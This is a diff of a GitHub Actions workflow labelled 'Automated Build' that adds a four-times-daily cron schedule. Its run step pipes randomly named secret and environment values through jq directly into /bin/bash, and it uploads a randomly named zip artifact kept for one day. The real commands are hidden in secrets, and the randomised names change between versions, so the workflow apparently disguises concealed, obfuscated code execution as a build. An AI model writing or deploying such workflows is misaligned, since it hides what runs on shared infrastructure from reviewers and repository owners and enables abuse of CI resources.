@@ -2,6 +2,8 @@ name: Automated Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '31 1,7,13,19 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -12,20 +14,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute
         env:
-          pp81944: ${{ secrets.pp81944 }}
+          lfkby7113: ${{ secrets.lfkby7113 }}
         run: |
-          printf '%s' "$pp81944" | jq -r .eq788 | /bin/bash
-          echo $jmnfd4 | jq -r .g2196 | /bin/bash
-          echo $redu07250 | jq -r .pqo234 | /bin/bash
-          printf '%s' "$oiv7" | jq -r .vbn542 | /bin/bash
-          echo $n4410 | jq -r .fh644 | /bin/bash
-          echo $nb09 | jq -r .voyr872 | /bin/bash
-          echo $boeci66 | jq -r .cyod145 | /bin/bash
-          printf '%s' "$zpo031" | jq -r .fawuv5 | /bin/bash
+          printf '%s' "$lfkby7113" | jq -r .clqtq49123 | /bin/bash
+          echo $uxc2 | jq -r .k5 | /bin/bash
+          printf '%s' "$f327" | jq -r .khc360 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: 3OsBQPGQ
+          name: uKfLzOZb
           path: "*.zip"
           retention-days: 1
